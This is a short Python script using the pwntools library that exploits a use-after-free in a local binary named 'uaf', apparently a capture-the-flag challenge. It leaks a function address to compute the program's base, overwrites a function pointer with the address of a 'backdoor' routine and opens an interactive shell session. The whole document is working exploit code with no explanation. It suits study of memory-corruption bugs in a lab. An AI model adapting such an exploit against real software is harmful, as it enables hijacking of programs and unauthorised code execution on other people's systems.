from pwn import *

p = process('./uaf')
elf = ELF('./uaf')

bye = elf.symbols['bye_func']
p.sendafter('Size of your message: ', str(16))
p.sendafter('Message: ', b'a'*8)
p.recvuntil(b'a'*8)
base = u64(p.recvline().strip().ljust(8, b'\x00')) - bye
backdoor = elf.symbols['backdoor'] + base
success('base -> %s' % str(hex(base)))

p.sendafter('Size of your message: ', str(16))
payload = b'a'*8 + p64(backdoor)
p.sendafter('Message: ', payload)

p.sendafter('Size of your message: ', str(100))
p.sendafter('Message: ', b'a'*8)

p.interactive()
